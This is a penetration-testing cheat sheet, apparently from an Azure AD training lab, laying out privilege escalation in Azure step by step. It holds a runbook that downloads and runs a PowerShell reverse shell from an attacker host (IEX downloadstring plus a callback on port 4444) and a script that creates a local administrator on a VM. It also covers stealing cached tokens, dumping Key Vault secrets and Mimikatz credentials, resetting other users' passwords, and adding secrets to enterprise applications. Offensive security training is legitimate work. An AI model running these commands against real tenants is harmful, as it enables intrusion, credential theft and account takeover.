# Privilege escalation
* [Privesc enumeration](#Privesc-enumeration)
* [Automation account](#Automation-account)
* [Command execution on a VM](#Command-execution-on-a-VM)
* [Getting credentials](#Getting-credentials)
  * [Stealing tokens](#Stealing-tokens)
  * [Keyvault](#Keyvault)
  * [Mimikatz](#Mimikatz)
  * [Powershell History](#Powershell-History)
  * [Transcript](#Transcript)
* [Reset password of other users](#Reset-password-of-other-users)
* [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
* [Deployments](#Deployments)
* [Storage account](#Storage-account)
* [Abusing dynamic groups](#Abusing-dynamic-groups)
* [Arm Templates History](#Arm-Templates-History)
* [Function apps continuous deployment](#Function-apps-continuous-deployment)

## Privesc enumeration
### When on a new machine
#### Get context of current user
```
az ad signed-in-user show
Get-AzContext
```

#### List all owned objects
```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <USER ID>
```

#### Get access token
Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token
az account get-access-token --resource-type ms-graph 
```

### General
#### List all accessible resources
```
Get-AzResource
```

#### Check if it can read any deployment
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

#### Check role assignments on ResourceID
```
Get-AzRoleAssignment -Scope <RESOURCE ID>
```

#### Get the allowed actions on the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Add a user to a group
- Required aad-graph token
```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

## Automation account
- Automation Account comes very handy in privilege escalation:
  - Run As account is by default contributor on the current subscription and possible to have contributor permissions on other subscriptions in the tenant.   
  - Often, clear-text privileges can be found in Runbooks. For example, a PowerShell runbook may have admin credentials for a VM to use PSRemoting. 
  - Access to connections, key vaults from a runbook. 
  - Ability to run commands on on-prem VMs if hybrid workers are in use.
  - Ability to run commands on VMs using DSC in configuration management.
  - A runbook often contains clear-text passwords for example psremoting!

#### Get information on automation accounts
```
az extension add --upgrade -n automation
az automation account list
```

### Get the tokens to use Az Powershell
```
az account get-access-token
az account get-access-token --resource-type aad-graph

$accesstoken = ''
$aadtoken = ''

Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
```

#### Get the role assigned of the automation accounts
- Check for the Roledefinitionn
```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
```

#### Check if a hybrid worker is in use by the automation account
```
Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
```

#### Import Powershell runbook
```
Import-AzAutomationRunbook -Name student38 -Path C:\AzAD\Tools\student38.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
```

#### Contents op studentx.ps1 for reverse shell
```
IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-PowerShellTcp.ps1")

reverse -Reverse -IPAddress 172.16.150.38 -Port 4444
```

#### Publish the automation runbook to the vm
```
Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

#### Start the runbook
```
Start-AzAutomationRunbook -RunbookName student38 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
```

## Command execution on a VM
- Vm access can be found after getting a new user or tokens and seeing that it has access to a vm

#### Connect with Az Powershell
```
$accesstoken = ''
Connect-AzAccount -AccessToken $accesstoken -AccountId <CLIENT ID OR EMAIL>
```

#### Get more information about the VM (networkprofile)
```
Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
```

#### Get the network interface
```
Get-AzNetworkInterface -Name bkpadconnect368
```

#### Query ID of public ip adress to get the public ip
```
Get-AzPublicIpAddress -Name bkpadconnectIP
```

#### Check role assignments on the VM
```
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
```

#### Check the allowed actions of the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

#### Run a command on the VM
```
Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
```

#### Contents of adduser.ps1
```
$passwd = ConvertTo-SecureString "Stud38Password@123" -AsPlainText -Force
New-LocalUser -Name student38 -Password $passwd
Add-LocalGroupMember -Group Administrators -Member student38
```

#### Access the VM
```
$password = ConvertTo-SecureString 'Stud38Password@123' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('student38', $Password)
$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
```

#### Check for credentials in powershell history (Try other ways to tho!)
```
cat C:\Users\bkpadconnect\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## Getting credentials
### Stealing tokens
#### Stealing tokens from az cli
- az cli stores access tokens in clear text in ```accessTokens.json``` in the directory ```C:\Users\<username>\.Azure```
- We can read tokens from the file, use them and request new ones too!
- azureProfile.json in the same directory contains information about subscriptions. 
- You can modify accessTokens.json to use access tokens with az cli but better to use with Az PowerShell or the Azure AD module.
- To clear the access tokens, always use az logout

#### Stealing tokens from az powershell
- Az PowerShell stores access tokens in clear text in ```TokenCache.dat``` in the directory ```C:\Users\<username>\.Azure```
- It also stores ServicePrincipalSecret in clear-text in AzureRmContext.jsonif a service principal secret is used to authenticate. 
- Another interesting method is to take a process dump of PowerShell and looking for tokens in it!
- Users can save tokens using Save-AzContext, look out for them! Search for Save-AzContext in PowerShell console history!
- Always use Disconnect-AzAccount!!

### Requesting tokens once logged in
```

```

### Keyvault
#### Get keyvault access token
```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### Login to account with access tokens for keyvault
```
$accesstoken = ''
$keyvaulttoken = ``

Connect-AzAccount -AccessToken $accesstoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
```

#### List all keyvaults
```
Get-AzKeyVault
```

#### Get info about a specific keyvault
```
Get-AzKeyVault -VaultName ResearchKeyVault
```

#### List the saved creds from keyvault
```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
```

#### Read creds from a keyvault
```
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

#### Connect with the credentials found and enumerate further!
```
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)

Connect-AzAccount -Credential $creds
```

### Mimikatz
```
Invoke-Mimikayz -Dumpcreds
```

#### Dump service account passwords
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

### Powershell History
```
type C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Transcript
```
type C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
```

## Reset password of other users
- Reset password if user has "authentication administrator" role on a group or administrative unit.

```
$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Force
(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributorx@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
```

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to autheticate as service principal.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Check what resources service principal can access
```
Get-AzResource
```

## Deployments
#### Check access to any resource group
```
Get-AzResourceGroup
```

### Check if managed identity can read any deployment from the resource group:
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCE GROUP NAME>
```

#### Save the deployment template
```
Save-AzResourceGroupDeploymentTemplate -ResourceGroupName SAP -DeploymentName stevencking_defcorphq.onmicrosoft.com.sapsrv
```

#### Find passwords in the template
- Or manually scan through it!
```
cat <PATH TO .json FILE> | Select-String password
```

## Storage account
#### Check accessible resources
```
Get-AzResource
```

#### Check if there is a container that is acccessible
```
Get-AzStorageContainer -Context (Get-AzStorageAccount -Name <NAME> -ResourceGroupName <RESOURCEGROUPNAME>).Context
```

#### Check using the "Storage Explorer" application! Might be possible then!

## Abusing dynamic groups
- By default, any user can invite guests in Azure AD. If a dynamic group rule allows adding users based on the attributes that a guest user can modify, it will result in abuse of this feature. For example based on EMAIL ID and join as guest that matches that rule.
- Login to the portal and check the groups. Is there any dynamic group?
- Click on the dynamic group and select "Dynamic membership rules". Is it possible to invite a user that complies to the rule?
- Go to Users and select "New Guest User"
- Open the user's profile and click on "(manage)" under invitation accepted. Select YES on resend invite and copy the URL.
- Open the URL in a private browser and login and accept the permissions.
- Connect to the tenant with AzureAD
- Set the secondary email for the user (Get the objectID of the user from the portal where we made the guest)
```
Set-AzureADUser -ObjectId 4a3395c9-be40-44ba-aff2-be502edd9619 -OtherMails vendorx@defcorpextcontractors.onmicrosoft.com -Verbose
```
- Check if the user is added to the dynamic group (Might take a bit)

## Arm Templates and Deployment History
- Any user with permissions `Microsoft.Resources/deployments/read` and `Microsoft.Resources/subscriptions/resourceGroups/read` can read the deployment history.
- Login to the azure portal
- Go to the deployments under settings and check the template for passwords or anything!
- Not sure if its possible by commands in any module!

## Function apps continuous deployment
- In case continuous deployment is used, a source code update triggers a deployment to Azure. 
- Following source code locations are supported
  - Azure Repos
  - GitHub
  - Bitbucket
- May be able to escalate privileges if we can own a continuous deployment and execute code on anything or add users!

